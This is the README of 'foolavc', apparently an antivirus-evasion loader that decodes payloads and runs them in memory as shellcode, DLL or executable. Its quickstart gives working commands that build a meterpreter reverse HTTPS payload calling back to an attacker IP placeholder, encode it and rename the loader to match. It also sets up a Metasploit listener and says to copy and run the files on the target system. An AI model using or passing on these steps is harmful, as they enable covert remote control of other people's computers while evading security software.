# foolavc

This project is [foolav](https://github.com/hvqzao/foolav) continuation.

Original [foolav](https://github.com/hvqzao/foolav) was offered only as x86 executable, used single encoding for externally kept payload file. Once foolav is executed, payload is loaded into memory and executed as a shellcode in separate thread.

foolavc on the other hand supports both x86 and x86_64 architectures, allows use of both internal (built-in) or external payloads. Those can be interpreted in one of three ways: shellcode, DLL and EXEcutable.

## Quickstart

```bash
cd foolavc
# create meterpreter executable
msfvenom -p windows/x64/meterpreter_reverse_https LHOST=__ATTACKER_IP__ LPORT=8443 -f exe -o met64.exe
# encode it to met64.me
python m-encode.py met64.exe
# foolavc.exe acts as a loader, must have same name as .me file created earlier
cp x64/Release/foolavc.exe met64.exe

# create .rc script for metasploit
echo >msf.rc <<EOF
use exploit/multi/handler
set payload windows/x64/meterpreter_reverse_https
set LPORT 8443
set LHOST 0.0.0.0
set ReverseListenerBindAddress 0.0.0.0
set AutoRunScript migrate -f
show options
run -j
EOF
# start metasploit console with above script
msfconsole -qL -r msf.rc

# now copy both met64.exe and met64.me to the target system and execute met64.exe (foolavc binary)
# meterpreter session should spawn
```

## Functionality

Once started binary checks for content of `xl variable (payload.h)`. If set, it will be loaded into memory as DLL. Same thing happens for `xe variable` (loaded and executed in memory as PE executable file). `xf variable`, if set, will be executed as shellcode. In order to generate payload, [x-encode.py](x-encode.py) script is provided.

External payloads should be stored in files in the same directory as executable. Those should be encoded using [m-encode.py](m-encode.py) scipt. `.ml` is threated as DLL, `.me` as EXE and `.mf` as shellcode. Executable checks its name and attempts to open file with same name and one of before mentioned extensions.

## Hints

 - Remember to use **consistent architecture** between binary and used payloads.

 - Once first present payload is executed, program waits for an input and is terminated. pause is used to wait for an input. If needed, this can be commented out or just bypassed - i.e. `echo | pause`

## License

[MIT License](LICENSE)

This project uses [MemoryModule](https://github.com/fancycode/MemoryModule) library (MPL 2.0 Licensed)
